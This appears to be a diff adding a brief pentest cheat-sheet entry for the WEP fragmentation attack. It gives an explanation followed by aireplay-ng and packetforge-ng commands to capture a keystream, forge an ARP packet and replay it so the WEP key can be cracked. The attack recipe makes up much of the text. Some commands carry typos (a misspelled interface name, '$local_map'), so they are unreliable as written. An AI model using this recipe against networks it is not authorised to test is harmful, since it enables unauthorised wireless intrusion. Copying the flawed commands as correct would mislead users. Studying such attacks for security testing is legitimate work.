@@ -1,0 +1,16 @@
+Fragmentation Attack
+
+This exploits WEP's packet fragmentation feature to extract the PRGA (Pseudo-Random Generation Algorithm) keystream from a single
+captured data packet, which can then be used to craft and inject arbitrary packets even without knowing the WEP key.
+This doesn't directly give you the WEP key - it gives you the ability to inject packets, which you then use to generate IVs for
+actual key cracking. 
+
+aireplay-ng -5 -b $ap_mac -h $local_mac wla1nmon
+
+Then you need to convert the keystream into a .cap file
+
+packetforge-ng --arp -y [keystream.xor] -a $ap_mac -h $local_mac -k 255.255.255.255 -l 255.255.255.255 -w output.cap
+
+THen replay the .cap file to generate traffic
+
+aireplay-ng -3 -b $ap_mac -h $local_map -r output.cap wlan1mon
